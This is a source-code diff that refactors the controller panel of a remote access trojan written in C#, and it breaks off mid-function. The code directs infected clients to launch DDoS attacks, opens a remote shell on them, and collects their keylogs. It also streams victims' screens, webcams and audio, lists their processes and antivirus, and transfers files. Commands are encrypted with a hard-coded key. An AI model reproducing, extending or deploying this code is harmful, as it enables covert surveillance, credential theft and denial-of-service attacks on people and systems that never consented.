@@ -84,7 +84,7 @@ namespace TutServer //Main Namespace
         /// <summary>
         /// Distributes the current path to plugins
         /// </summary>
-        private String Current_Path { get { return _currentPath; } set { _currentPath = value; sCore.RAT.FileSystem.SetCurrentDirectory(hostToken, value); } }
+        private String CurrentPath { get { return _currentPath; } set { _currentPath = value; sCore.RAT.FileSystem.SetCurrentDirectory(hostToken, value); } }
         /// <summary>
         /// File transfer from location
         /// </summary>
@@ -397,10 +397,8 @@ namespace TutServer //Main Namespace
             /// <returns>True if the socket is a linux client, otherwise false</returns>
             public bool IsLinuxClient(Socket s)
             {
-                bool result = false; //Declare result
                 int socketID = ctx.GetSocket(s); //Get the index of the socket
-                result = IsLinuxClient(socketID); //Check if socket is added to the manager
-                return result; //return the result
+                return IsLinuxClient(socketID); //Check if socket is added to the manager
             }
 
             /// <summary>
@@ -410,14 +408,12 @@ namespace TutServer //Main Namespace
             /// <returns>True if it's a linux client, otherwise false</returns>
             public bool IsLinuxClient(int clientID)
             {
-                bool result = false;
-
                 if (clientListAssoc.Contains(clientID))
                 {
-                    result = true;
+                    return true;
                 }
 
-                return result;
+                return false;
             }
 
             /// <summary>
@@ -428,13 +424,11 @@ namespace TutServer //Main Namespace
             {
                 string command = Encoding.ASCII.GetString(buffer); //Linux sends ASCII encoded text
 
-                Console.WriteLine("Command sent: " + command); //Print the command
-
                 if (command.StartsWith("lprocset")) //Set the process list
                 {
                     command = command.Substring(8); //Remove the command header
-                    String[] lines = command.Split('\n'); //Split the command into lines
-                    String headerLine = lines[0]; //Header of ps -aux command
+                    string[] lines = command.Split('\n'); //Split the command into lines
+                    string headerLine = lines[0]; //Header of ps -aux command
                     int pidIndex = headerLine.IndexOf("PID"); //The index of the PID column
                     pidIndex += 2; //Increase with 2, because PIDs start at "D"
                     int commandIndex = headerLine.IndexOf("COMMAND"); //The index of command (executed file path + args) here used as process name
@@ -446,7 +440,7 @@ namespace TutServer //Main Namespace
                     {
                         string line = lines[i]; //The current line
                         line = line.Replace("\r", String.Empty); //Remove the \r from the line
-                        if (line == "" | line == String.Empty) continue; //If line is empty, then skip it
+                        if (line == "" || line == String.Empty) continue; //If line is empty, then skip it
                         string strPid = ""; //The current PID
                         string strProcName = ""; //The current process name
 
@@ -504,9 +498,10 @@ namespace TutServer //Main Namespace
                 if (text.StartsWith("cmd§")) //If we send cmd commands
                 {
                     text = text.Substring(4); //Remove the command header
+                    ctx.Append("user@remoteShell: " + text + Environment.NewLine); //Append the command to the shell window
                     text = "cmd|" + text; //Create a new command
-                    ctx.Append("user@remoteShell: " + text.Replace("cmd|", String.Empty) + Environment.NewLine); //Append the command to the shell window
                 }
+
                 byte[] buffer = Encoding.ASCII.GetBytes(text); //Create the text buffer
                 Socket s = ctx.GetSocketById(target); //Get the target socket
                 s.Send(buffer); //Send the command to the socket
@@ -583,7 +578,7 @@ namespace TutServer //Main Namespace
             /// <summary>
             /// The directory of the plugins
             /// </summary>
-            string dir = "";
+            private readonly string dir = "";
             /// <summary>
             /// List of assemblies for plugin files
             /// </summary>
@@ -603,7 +598,7 @@ namespace TutServer //Main Namespace
             /// <summary>
             /// Master key for revoking permissions (plugins cannot have this)
             /// </summary>
-            private string masterKey;
+            private readonly string masterKey;
 
             /// <summary>
             /// Constructor
@@ -651,7 +646,7 @@ namespace TutServer //Main Namespace
                 if (!ifaceList.ContainsKey(dllName)) return; //Check if the plugin is loaded
                 IPluginMain iface = ifaceList[dllName]; //Retrieve the plugin main
                 iface.Main(); //Call the plugins main method
-                if (!runningPlugins.Contains(iface))runningPlugins.Add(iface);
+                if (!runningPlugins.Contains(iface)) runningPlugins.Add(iface);
             }
 
             /// <summary>
@@ -661,8 +656,10 @@ namespace TutServer //Main Namespace
             {
                 scriptDlls.Clear(); //Clear the list of scriptDlls
                 ifaceList.Clear(); //Clear the list of plugin interafaces
-                foreach (string file in Directory.GetFiles(dir)) //Loop through the plugin files
+                string[] files = Directory.GetFiles(dir);
+                for (int i = 0; i < files.Length; i++) //Loop through the plugin files
                 {
+                    string file = files[i];
                     if (!file.EndsWith(".dll")) continue; // Not a DLL File
                     Assembly currentAssembly = Assembly.LoadFrom(new FileInfo(file).FullName); //Get the assembly of the file
                     scriptDlls.Add(new FileInfo(file).Name, currentAssembly); //Add the assembly to the list
@@ -680,11 +677,11 @@ namespace TutServer //Main Namespace
             /// </summary>
             /// <param name="pluginName">The name of the plugin</param>
             /// <returns>An array of object filled with the plugin information</returns>
-            public object[] GetPluginInfo(string pluginName)
+            public IPluginMain GetPluginInfo(string pluginName)
             {
                 if (!ifaceList.ContainsKey(pluginName)) return null; //Plugin is not loaded
                 IPluginMain iface = ifaceList[pluginName]; //Get the interface
-                return new object[] { iface.ScriptName, iface.Scriptversion, iface.ScriptDescription, iface.ScriptPermissions, iface.AuthorName }; //Return the data
+                return iface; // Return the plugin interface
             }
 
             /// <summary>
@@ -1144,7 +1141,7 @@ namespace TutServer //Main Namespace
             }
 
             SendToTarget("fdir§" + folderName); //Send command to list remote files
-            Current_Path = folderName; //Set the current path
+            CurrentPath = folderName; //Set the current path
             listView3.Items.Clear(); //Clear the files listView
         }
 
@@ -1153,7 +1150,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         public void XUp1()
         {
-            SendToTarget("fdir§" + Current_Path); //Send command to up1 directory          
+            SendToTarget("fdir§" + CurrentPath); //Send command to up1 directory          
         }
 
         /// <summary>
@@ -1557,9 +1554,8 @@ namespace TutServer //Main Namespace
         /// </summary>
         public void ScreenFPS()
         {
-            Form1 f1 = new Form1(); //Create a new instance of Form1
-            int value = f1.trackBar1.Value; //Get the trackBar's value
-            f1.lblQualityShow.Text = value.ToString(); //Display the trackBar's value
+            int value = me.trackBar1.Value; //Get the trackBar's value
+            me.lblQualityShow.Text = value.ToString(); //Display the trackBar's value
 
             //Decide FPS based on it's position
             if (value < 25)
@@ -1613,7 +1609,16 @@ namespace TutServer //Main Namespace
         /// <param name="isAllClient">Attack with all connected clients</param>
         private void StartDDoS(string ip, string port, string protocol, string packetSize, string threads, string delay, bool isAllClient)
         {
-            String command = "ddosr|" + ip + "|" + port + "|" + protocol + "|" + packetSize + "|" + threads + "|" + delay; //Construct the command
+            StringBuilder sb = new StringBuilder();
+            sb.Append("ddosr|")
+                .Append(ip).Append("|")
+                .Append(port).Append("|")
+                .Append(protocol).Append("|")
+                .Append(packetSize).Append("|")
+                .Append(threads).Append("|")
+                .Append(delay);
+
+            string command = sb.ToString();
             if (isAllClient) //If we want to attack with every client
             {
                 int inc = 0; //Declare index variable
@@ -1635,11 +1640,11 @@ namespace TutServer //Main Namespace
         /// Test if target received DDoS packets
         /// </summary>
         /// <param name="ip">The IP address to test</param>
-        /// <param name="prot">The protocol to use for testing</param>
+        /// <param name="port">The protocol to use for testing</param>
         /// <returns>If the target can be reached via the protocol</returns>
-        private bool TestDDoS(string ip, string prot)
+        private bool TestDDoS(string ip, string port)
         {
-            if (prot == "ICMP ECHO (Ping)") //Ping protocol
+            if (port == "ICMP ECHO (Ping)") //Ping protocol
             {
                 System.Net.NetworkInformation.Ping ping = new System.Net.NetworkInformation.Ping(); //Create a new ping object
                 System.Net.NetworkInformation.PingReply reply = ping.Send(ip, 1000, Encoding.Unicode.GetBytes("Test")); //Send the ping and read the reply
@@ -1656,7 +1661,7 @@ namespace TutServer //Main Namespace
                     return false; //Return false
                 }
             }
-            if (prot == "TCP") //Use TCP protocol
+            else if (port == "TCP") //Use TCP protocol
             {
                 TcpClient client = new TcpClient(); //Create a new client
                 try
@@ -1682,7 +1687,7 @@ namespace TutServer //Main Namespace
                     return false; //Return false
                 }
             }
-            if (prot == "UDP") //Test UDP connection
+            else // UDP Connection
             {
                 try
                 {
@@ -1701,8 +1706,6 @@ namespace TutServer //Main Namespace
                     return false; //Return false
                 }
             }
-
-            return false; //Return false (in case of invalid protocol names)
         }
 
         /// <summary>
@@ -1730,10 +1733,11 @@ namespace TutServer //Main Namespace
         /// <param name="content">The content to save</param>
         public void SaveFile(String content)
         {
-            String cmd = "putfile§" + edit_content + "§" + content; //Construct the command
+            string cmd = "putfile§" + edit_content + "§" + content; //Construct the command
             SendToTarget(cmd); //Send the command to the client
             RefreshFiles(); //Refresh the file list
         }
+
         /// <summary>
         /// Display an inputbox on the local system
         /// </summary>
@@ -1792,7 +1796,7 @@ namespace TutServer //Main Namespace
             Application.DoEvents(); //Do the events
             System.Threading.Thread.Sleep(1500); //Wait for 1.5 seconds
             listView3.Items.Clear(); //Clear the file list
-            String cmd = "fdir§" + Current_Path; //Construct the command
+            string cmd = "fdir§" + CurrentPath; //Construct the command
             SendToTarget(cmd); //Send the command to the client
         }
 
@@ -1801,9 +1805,9 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="command">The command to send</param>
         /// <param name="targetClient">The client to send the command to</param>
-        private void SendCommand(String command, int targetClient)
+        private void SendCommand(string command, int targetClient)
         {
-            try //Try
+            try
             {
                 Socket s = _clientSockets[targetClient]; //Get the socket
 
@@ -1813,13 +1817,11 @@ namespace TutServer //Main Namespace
                     return; //Return
                 }
 
-                try //Try
+                try
                 {
-                    String k = command; //Store the command
-
-                    String crypted = Encrypt(k); //Encrypt the comand
-                    byte[] data = Encoding.Unicode.GetBytes(crypted); //Get the unicode bytes of the comand
-                    String header = crypted.Length.ToString() + "§"; //Create message length header
+                    command = Encrypt(command); //Encrypt the comand
+                    byte[] data = Encoding.Unicode.GetBytes(command); //Get the unicode bytes of the comand
+                    string header = command.Length.ToString() + "§"; //Create message length header
                     byte[] byteHeader = Encoding.Unicode.GetBytes(header); //Convert the header to bytes
                     byte[] fullBytes = new byte[byteHeader.Length + data.Length]; //Allocate space for the full message
                     Array.Copy(byteHeader, fullBytes, byteHeader.Length); //Copy the message hader to the full message
@@ -1850,7 +1852,7 @@ namespace TutServer //Main Namespace
         /// Send a command to every controlled client
         /// </summary>
         /// <param name="command">The command to send</param>
-        public void SendToTarget(String command)
+        public void SendToTarget(string command)
         {
             SendCommand(command, controlClient);
         }
@@ -1884,7 +1886,6 @@ namespace TutServer //Main Namespace
         {
             string EncryptionKey = "MAKV2SPBNI99212"; //Declare the encryption key (it's not the best thing to do)
             byte[] clearBytes = Encoding.Unicode.GetBytes(clearText); //Get the bytes of the message
-            Console.WriteLine("PlainText command: " + clearText); //Debug Function
             using (Aes encryptor = Aes.Create()) //Create a new aes object
             {
                 Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 }); //Get encryption key
@@ -1901,7 +1902,6 @@ namespace TutServer //Main Namespace
                     clearText = System.Convert.ToBase64String(ms.ToArray()); //Convert the encrypted bytes to a Base64 string
                 }
             }
-            Console.WriteLine("Encrypted Command: " + clearText); //Debug Function
             return clearText; //Return the encrypted command
         }
 
@@ -1945,6 +1945,7 @@ namespace TutServer //Main Namespace
             }
         }
 
+        // TODO: this could become a class to pass references only
         /// <summary>
         /// Struct for storing Client Information
         /// </summary>
@@ -1961,7 +1962,7 @@ namespace TutServer //Main Namespace
         /// <returns>The socket of the client</returns>
         public Socket GetSocketById(int id)
         {
-            if (id > _clientSockets.Count) return null; //Check if the ID is too big
+            if (id >= _clientSockets.Count) return null; //Check if the ID is too big
             return _clientSockets[id]; //Return the socket of the client
         }
 
@@ -2008,6 +2009,7 @@ namespace TutServer //Main Namespace
                 pages.Add(p); //Add the current page to the list
             }
 
+            // TODO: do we actually need routeWindow or does it just hurt the performance?
             Timer update = new Timer
             {
                 Interval = 100 // prev. 3000 //Set update frequency
@@ -2088,7 +2090,7 @@ namespace TutServer //Main Namespace
            _clientSockets.Add(socket); //Add the new socket to the list
            int id = _clientSockets.Count - 1; //Get the new ID for the client
            AddlvClientCallback("Client " + id); //Update the listView
-           String cmd = "getinfo-" + id.ToString(); //Construct the command
+           string cmd = "getinfo-" + id.ToString(); //Construct the command
            SendCommand(cmd, id); //Send the command
            socket.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, socket); //Add the reading callback
            _serverSocket.BeginAccept(AcceptCallback, null); //Restart accepting clients
@@ -2121,12 +2123,12 @@ namespace TutServer //Main Namespace
             {
                 if (s == socket) //If the sockets match
                 {
-                    break; //Break the loop
+                    return tracer; //Return the index of the socket
                 }
                 tracer++; //Increment the index
             }
 
-            return tracer; //Return the index of the socket
+            return -1; // Return a negative index, causing an exception
         }
 
         /// <summary>
@@ -2143,11 +2145,11 @@ namespace TutServer //Main Namespace
 
             try
             {
-                if(IsException == false) //If no exceptions
+                if(!IsException) //If no exceptions
                 {
                     received = current.EndReceive(AR); //Get the number of recevied bytes
                 }
-                if (IsException == true) //If exception then
+                else //If exception then
                 {
                    received = current.EndReceive(AR); //Get the jibberish
                    received = 0; //Reset it back to 0
@@ -2168,487 +2170,463 @@ namespace TutServer //Main Namespace
             }
 
 
-            byte[] recBuf = new byte[received]; //Declare a new received buffer with the size of the received bytes
-            Array.Copy(_buffer, recBuf, received); //Copy from the big array to the new array, with the size of the received bytes
-            bool ignoreFlag = false; //Declare the ignore flag
-
-            if (MultiRecv) //If a surveillance module is running
+            if (received > 0) // Check if we have any data
             {
-                try //Try
-                {
-                    String header = Encoding.Unicode.GetString(recBuf, 0, 8 * 2); //Get the header of the message
+                byte[] recBuf = new byte[received]; //Declare a new received buffer with the size of the received bytes
+                Array.Copy(_buffer, recBuf, received); //Copy from the big array to the new array, with the size of the received bytes
+                bool ignoreFlag = false; //Declare the ignore flag
 
-                    if (header == "rdstream") //If it's a remote desktop stream
+                if (MultiRecv) //If a surveillance module is running
+                {
+                    try //Try
                     {
-                        using (MemoryStream stream = new MemoryStream()) //Declare the new memory stream
+                        // TODO: send byte codes instead of string values as headers
+                        string header = Encoding.Unicode.GetString(recBuf, 0, 8 * 2); //Get the header of the message
+
+                        if (header == "rdstream") //If it's a remote desktop stream
                         {
-                            stream.Write(recBuf, 8 * 2, recBuf.Length - 8 * 2); //Copy the data from the buffer, to the memory stream
-                            //Console.WriteLine("multiRecv Length: " + recBuf.Length);
-                            Bitmap deskimage = (Bitmap)Image.FromStream(stream); //Create a bitmap image from the memory stream
-                            if (resdataav == 0) //If resolution data is not set
+                            using (MemoryStream stream = new MemoryStream()) //Declare the new memory stream
                             {
-                                resx = deskimage.Width; //Set the resolution width to the image width
-                                resy = deskimage.Height; //Set the resolution height to the image height
-                                resdataav = 1; //The resolution data is set now
+                                stream.Write(recBuf, 8 * 2, recBuf.Length - 8 * 2); //Copy the data from the buffer, to the memory stream
+                                                                                    //Console.WriteLine("multiRecv Length: " + recBuf.Length);
+                                Bitmap deskimage = (Bitmap)Image.FromStream(stream); //Create a bitmap image from the memory stream
+                                if (resdataav == 0) //If resolution data is not set
+                                {
+                                    resx = deskimage.Width; //Set the resolution width to the image width
+                                    resy = deskimage.Height; //Set the resolution height to the image height
+                                    resdataav = 1; //The resolution data is set now
+                                }
+                                SetImage(deskimage); //Set the image of the remote desktop
+                                Array.Clear(recBuf, 0, received); //Clear the buffer
+                                ignoreFlag = true; //Set the ignore flag
+
+                                GC.Collect(); //Call the garbage collector
+                                GC.WaitForPendingFinalizers();
+                                System.Threading.Thread.SpinWait(5000);
                             }
-                            SetImage(deskimage); //Set the image of the remote desktop
-                            Array.Clear(recBuf, 0, received); //Clear the buffer
+                        }
+
+                        if (header == "austream") //If it's an audio stream
+                        {
+                            byte[] data = new Byte[recBuf.Length]; //Declare a new buffer for audio data
+                            Buffer.BlockCopy(recBuf, 8 * 2, data, 0, recBuf.Length - 8 * 2); //Copy from the received buffer to the audio buffer
+                            recBuf = null; //Remove the received buffer
+                            astream.BufferPlay(data); //Playback the audio stream
                             ignoreFlag = true; //Set the ignore flag
-
-                            GC.Collect(); //Call the garbage collector
-                            GC.WaitForPendingFinalizers();
-                            System.Threading.Thread.SpinWait(5000);
-                        }
-                    }
-
-                    if (header == "austream") //If it's an audio stream
-                    {
-                        byte[] data = new Byte[recBuf.Length]; //Declare a new buffer for audio data
-                        Buffer.BlockCopy(recBuf, 8 * 2, data, 0, recBuf.Length - 8 * 2); //Copy from the received buffer to the audio buffer
-                        recBuf = null; //Remove the received buffer
-                        astream.BufferPlay(data); //Playback the audio stream
-                        ignoreFlag = true; //Set the ignore flag
-                    }
-
-                    if (header == "wcstream") //If it's a web cam stream
-                    {
-                        MemoryStream stream = new MemoryStream(); //Declare a new memory stream
-
-                        stream.Write(recBuf, 8 * 2, recBuf.Length - 8 * 2); //Copy from the buffer to the memory stream
-                        Console.WriteLine("multiRecv Length: " + recBuf.Length); //Debug function
-
-                        Bitmap camimage = (Bitmap)Image.FromStream(stream); //Create a bitmap from the memory stream
-
-                        stream.Flush(); //Flush the stream
-                        stream.Close(); //Close the stream
-                        stream.Dispose(); //Dispose the stream
-                        stream = null; //Remove the stream
-                        SetWebCam(camimage); //Set the web cam image to the new frame
-                        Array.Clear(recBuf, 0, received); //Clear the receive buffer
-                        ignoreFlag = true; //Set the ignore flag
-                    }
-                }
-                catch(Exception ) //Something went wrong
-                {
-                    //Do nothing
-                }
-            }
-
-            if (isFileDownload && !ignoreFlag) //If file download is in progress and it's not a sureveillance data
-            {
-                Buffer.BlockCopy(recBuf, 0, recvFile, write_size, recBuf.Length); //Copy from the receive buffer to the file buffer
-                write_size += recBuf.Length; //Update the write size
-
-                if (write_size == fdl_size) //If the write size matches the full download size
-                {
-                    String rLocation = fdl_location; //Get the store location
-                    using (FileStream fs = File.Create(rLocation)) //Create a new fileStream at the location
-                    {
-                        Byte[] info = recvFile; //Get the file bytes
-                        fs.Write(info, 0, info.Length); //Write the bytes to the file
-                    }
-
-                    Array.Clear(recvFile, 0, recvFile.Length); //Clear the file buffer
-                    Msgbox("File Download", "File receive confirmed!", MessageBoxButtons.OK, MessageBoxIcon.Information); //Update the user on the download
-                    isFileDownload = false; //Set the download flag to false
-                }
-
-                //Array.Clear(recvFile, 0, recvFile.Length); //Clear the file buffer
-                //msgbox("File Download", "File receive confirmed!", MessageBoxButtons.OK, MessageBoxIcon.Information); //Update the user on the download
-                //isFileDownload = false; //Set the download flag to false
-            }
-
-            if (!isFileDownload && !ignoreFlag) //If no file download, and it's not surveillance data
-            {
-                System.Threading.Thread clThread = new System.Threading.Thread(new System.Threading.ParameterizedThreadStart(CheckLinux)); //Create a linux client checking thread
-                ClientObject obj = new ClientObject
-                {
-                    buffer = recBuf, //Set the buffer of the client object
-                    s = current //Set the socket of the client object
-                }; //Create a new client object
-
-                clThread.Start(obj); //Start checking if client is linuy or windows
-                try //Try
-                {
-
-                    text = Encoding.Unicode.GetString(recBuf); //Get the text from the receive buffer
-                    text = Decrypt(text); //Decrypt the received text
-
-                }
-                catch (Exception ex) //Something went wrong
-                {
-                    MessageBox.Show("Original Error :: " + ex.Message); //Display the error message
-                }
-
-
-                if (lcm != null) //If linux client manager is not null
-                {
-                    if (lcm.IsLinuxClient(current)) //Check if our client is a linux client
-                    {
-                        lcm.RunCustomCommands(recBuf); //Run the command through the manager
-                        text = Encoding.ASCII.GetString(recBuf); //Convert the text to ASCII encoded charaters
-                    }
-                }
-                if (text != null) //If text us not null
-                {
-                    if (text.StartsWith("infoback;")) //Info received from client
-                    {
-                        int id = int.Parse(text.Split(';')[1]); //The client ID
-                        String data = text.Split(';')[2]; //The rest of the data
-                        String[] lines = data.Split('|'); //Split the data into parts
-                        //MessageBox.Show(data);
-                        String name = lines[0]; //The Computer Name
-                        String ip = lines[1]; //The computer's local IPv4 address
-                        String time = lines[2]; //The computer's date and time
-                        String av = lines[3]; //The computer's installed Anti Virus product
-
-                        SetlvClientInfoCallback(name, ip, time, av, id); //Update the UI
-                    }
-
-                    if (text.StartsWith("ScreenCount")) //get screen count result back from the client 
-                    {
-                        string screens = string.Empty; //Declare the screen variable
-
-                        screens = text.Replace("ScreenCount", "").Replace(" ", ""); //Get the installed screens of the client
-
-                        foreach (char screen in screens) //Loop through the screens of the client
-                        {
-                            SetClientScreenCountCallBack(screen); //Update the UI     
                         }
 
-                    }
-
-                    if (text.StartsWith("setproc|")) //Process list received from client
-                    {
-                        foreach (String line in text.Split('\n')) //Loop through the processes
+                        if (header == "wcstream") //If it's a web cam stream
                         {
-                            if (line == "") continue; //If line is empty, then skip it
+                            MemoryStream stream = new MemoryStream(); //Declare a new memory stream
 
-                            String name = line.Split('|')[1]; //The name of the process
-                            String responding = line.Split('|')[2]; //If the process is responding
-                            String title = line.Split('|')[3]; //The title of the processe's main window
-                            String priority = line.Split('|')[4]; //The priorty of the process
-                            String path = line.Split('|')[5]; //The full path of the launched process
-                            String id = line.Split('|')[6]; //The PID
+                            stream.Write(recBuf, 8 * 2, recBuf.Length - 8 * 2); //Copy from the buffer to the memory stream
+                            Console.WriteLine("multiRecv Length: " + recBuf.Length); //Debug function
 
-                            SetprocInfoCallback(name, responding, title, priority, path, id); //Update the UI
-                        }
+                            Bitmap camimage = (Bitmap)Image.FromStream(stream); //Create a bitmap from the memory stream
 
-                        SortList(listView2); //Sort the processes by thier name
-                    }
-
-                    if (text.StartsWith("cmdout§")) //The client sent the output of a command line command
-                    {
-                        //MessageBox.Show("test");
-                        String output = text.Split('§')[1]; //Get the output of the command
-                        output = output.Replace("cmdout", String.Empty); //Format the output
-                        Append(output); //Append the output to the command window
-                    }
-
-                    if (text.StartsWith("fdrivel§")) //The client sent a list of drives
-                    {
-                        String data = text.Split('§')[1]; //Get the drive listing
-
-                        LvClear(listView3); //Clear the listView for drives
-
-                        foreach (String drive in data.Split('\n')) //Loop through the drives
-                        {
-                            if (!drive.Contains("|")) continue; //If incorrect drive, then skip it
-                            String name = drive.Split('|')[0]; //Get the label of the drive (C:, D:, E: etc.)
-                            String size = Convert(drive.Split('|')[1]); //Get the total size of the drive
-
-                            AddFileCallback(name, size, "N/A", name); //Update the UI
+                            stream.Flush(); //Flush the stream
+                            stream.Close(); //Close the stream
+                            stream.Dispose(); //Dispose the stream
+                            stream = null; //Remove the stream
+                            SetWebCam(camimage); //Set the web cam image to the new frame
+                            Array.Clear(recBuf, 0, received); //Clear the receive buffer
+                            ignoreFlag = true; //Set the ignore flag
                         }
                     }
-
-                    if (text.StartsWith("fdirl")) //The client sent the list of entries in a directory
+                    catch (Exception) //Something went wrong
                     {
-                        String data = text.Substring(5); //Remove the command header from the message
-                        String[] entries = data.Split('\n'); //Get the entries from the data
+                        //Do nothing
+                    }
+                }
 
-                        foreach (String entry in entries) //Loop through every entry in the list
+                else if (isFileDownload && !ignoreFlag) //If file download is in progress and it's not a sureveillance data
+                {
+                    // TODO: this won't work for big files, write to fs on receive
+                    Buffer.BlockCopy(recBuf, 0, recvFile, write_size, recBuf.Length); //Copy from the receive buffer to the file buffer
+                    write_size += recBuf.Length; //Update the write size
+
+                    if (write_size == fdl_size) //If the write size matches the full download size
+                    {
+                        String rLocation = fdl_location; //Get the store location
+                        using (FileStream fs = File.Create(rLocation)) //Create a new fileStream at the location
                         {
-                            if (entry == "") continue; //If the entry is empty then skip it
-                            String name = entry.Split('§')[0]; //Get the name of the entry
-                            String size = Convert(entry.Split('§')[1]); //Get the total size of the entry
-                            String crtime = entry.Split('§')[2]; //Get the creation time of the entry
-                            String path = entry.Split('§')[3]; //Get the full path to the entry
-                            //Console.WriteLine(entry.Split('§')[1]);
-                            AddFileCallback(name, size, crtime, path); //Update the UI
+                            Byte[] info = recvFile; //Get the file bytes
+                            fs.Write(info, 0, info.Length); //Write the bytes to the file
+                        }
+
+                        Array.Clear(recvFile, 0, recvFile.Length); //Clear the file buffer
+                        Msgbox("File Download", "File receive confirmed!", MessageBoxButtons.OK, MessageBoxIcon.Information); //Update the user on the download
+                        isFileDownload = false; //Set the download flag to false
+                    }
+                }
+
+                else if (!isFileDownload && !ignoreFlag) //If no file download, and it's not surveillance data
+                {
+                    System.Threading.Thread clThread = new System.Threading.Thread(new System.Threading.ParameterizedThreadStart(CheckLinux)); //Create a linux client checking thread
+                    ClientObject obj = new ClientObject
+                    {
+                        buffer = recBuf, //Set the buffer of the client object
+                        s = current //Set the socket of the client object
+                    }; //Create a new client object
+
+                    clThread.Start(obj); //Start checking if client is linuy or windows
+                    try //Try
+                    {
+                        text = Encoding.Unicode.GetString(recBuf); //Get the text from the receive buffer
+                        text = Decrypt(text); //Decrypt the received text
+                    }
+                    catch (Exception ex) //Something went wrong
+                    {
+                        MessageBox.Show("Original Error :: " + ex.Message); //Display the error message
+                    }
+
+
+                    if (lcm != null) //If linux client manager is not null
+                    {
+                        if (lcm.IsLinuxClient(current)) //Check if our client is a linux client
+                        {
+                            lcm.RunCustomCommands(recBuf); //Run the command through the manager
+                            text = Encoding.ASCII.GetString(recBuf); //Convert the text to ASCII encoded charaters
                         }
                     }
-
-                    if (text.StartsWith("backfile§")) //The client sent file contents to the editor
+                    if (text != null) //If text is not null
                     {
-                        String content = text.Split('§')[1]; //Get the content of the file
-                        StartEditor(content, me); //Start the editor window
-                    }
-
-                    if (text == "fconfirm") //Client accepted to receive a file
-                    {
-                        Byte[] databyte = File.ReadAllBytes(fup_local_path); //Get the bytes of the file
-                        SendBytesToTarget(databyte); //Send the file to the client
-                    }
-
-                    if (text == "frecv") //Client confirmed that the file is uploaded
-                    {
-                        Msgbox("File Upload", "File receive confirmed!", MessageBoxButtons.OK, MessageBoxIcon.Information); //Notify the user
-                    }
-
-                    if (text.StartsWith("finfo§")) //Client sent info about a file we want to download
-                    {
-                        int size = int.Parse(text.Split('§')[1]); //Get the size of the file
-                        fdl_size = size; //Set the size of the file
-                        recvFile = new byte[fdl_size]; //Create a new buffer for the file
-                        isFileDownload = true; //Set the file download flag
-                        SendToTarget("fconfirm"); //Notify the client to send the file
-                    }
-
-                    if (text.StartsWith("f1§")) //The client sent the up1 directory in the tree
-                    {
-                        String dir = text.Split('§')[1]; //Get the parent directory
-
-                        if (dir != "drive") GetParentDirectory(dir); //If it's not the drive list the update the file list
-                        if (dir == "drive") //If it's the drive list
+                        if (text.StartsWith("infoback;")) //Info received from client
                         {
-                            Current_Path = "drive"; //Set the current path to the drive listing
-                            SendToTarget("fdrive"); //List the drives
-                            LvClear(listView3); //Clear the file list
+                            string[] mainContainer = text.Split(';'); // Get the main data parts
+                            int id = int.Parse(mainContainer[1]); //The client ID
+                            string[] lines = mainContainer[2].Split('|'); //Split the data into parts
+                            string name = lines[0]; //The Computer Name
+                            string ip = lines[1]; //The computer's local IPv4 address
+                            string time = lines[2]; //The computer's date and time
+                            string av = lines[3]; //The computer's installed Anti Virus product
+
+                            SetlvClientInfoCallback(name, ip, time, av, id); //Update the UI
                         }
-                    }
-
-                    if (text.StartsWith("putklog")) //Client sent the keylog
-                    {
-                        String dump = text.Substring(7); //Remove the command header
-                        SetLog(dump); //Update the UI
-                    }
-
-                    if (text.StartsWith("dclient")) //Client is going to disconnect
-                    {
-                        Console.WriteLine("Client Disconnected"); //Debug Function
-                        dclient = true; //Set the disconnect flag
-                        SwitchTab(tabPage1); //Switch to the client selection module
-                        killtarget = GetSocket(current); //Get the id of the affected socket
-                        killSocket = current; //Set the affected socket
-                        if (controlClient == killtarget) //If the affected client is the controlled one
+                        else if (text.StartsWith("ScreenCount")) //get screen count result back from the client 
                         {
-                            //TODO: write UI reset code
-                            RemotePipe[] rpArray = { null }; //Create a new remote pipe array
-                            sCore.RAT.ExternalApps.ClearIPCConnections(hostToken); //Clear the list of ipc connections for plugins
-                            Array.Copy(rPipeList.ToArray(), rpArray, rPipeList.Count); //Get the list of pipes
-                            foreach (RemotePipe rp in rpArray) //Go through each pipe in the list
+                            string screens = string.Empty; //Declare the screen variable
+
+                            screens = text.Replace("ScreenCount", "").Replace(" ", ""); //Get the installed screens of the client
+
+                            for (int i = 0; i < screens.Length; i++) // Loop through the screens of the client
                             {
-                                if (rp == null) continue; //If the pipe is closed, then skip it
-                                rp.RemoteRemove = false; //Set the remove flag
-                                ClosePipe(rp); //Close the remote pipe
+                                SetClientScreenCountCallBack(screens[i]); // Update the UI
+                            }
+                        }
+                        else if (text.StartsWith("setproc|")) //Process list received from client
+                        {
+                            foreach (string line in text.Split('\n')) //Loop through the processes
+                            {
+                                if (line == "") continue; //If line is empty, then skip it
+
+                                string[] procData = line.Split('|');
+
+                                string name = procData[1]; //The name of the process
+                                string responding = procData[2]; //If the process is responding
+                                string title = procData[3]; //The title of the processe's main window
+                                string priority = procData[4]; //The priorty of the process
+                                string path = procData[5]; //The full path of the launched process
+                                string id = procData[6]; //The PID
+
+                                SetprocInfoCallback(name, responding, title, priority, path, id); //Update the UI
                             }
 
-                            rPipeList.Clear(); //Clear the list of pipes
+                            SortList(listView2); //Sort the processes by thier name
                         }
-                        int id = killtarget; //Declare the client id
-                        reScanTarget = true; //Set the rescan flag
-                        reScanStart = id; //Set the rescan starting id
-                        if (lcm != null) //If linux client manager is enabled
+                        else if (text.StartsWith("cmdout§")) //The client sent the output of a command line command
                         {
-                            if (lcm.IsLinuxClient(id)) lcm.RemoveAssociation(id); //If it's a linux client, then remove it from the manager
+                            string output = text.Substring(7); //Get the output of the command
+                            output = output.Replace("cmdout", String.Empty); //Format the output
+                            Append(output); //Append the output to the command window
                         }
-                        Console.WriteLine("Timer Removed Client"); //Debug Function
-                        killSocket.Close(); //Close the affected socket
-                        _clientSockets.Remove(killSocket); //Remove the affected socket from the list
-                        RestartServer(id); //Restart the server
-                    }
-
-                    if (text.StartsWith("alist")) //Client sent the list of audio devies of thier machine
-                    {
-                        LvClear(listView4); //Clear the audio devices listView
-                        String data = text.Substring(5); //Remove the command header from the message
-                        int devices = 0; //Declare the count of devices
-                        foreach (String device in data.Split('§')) //Go through all devices
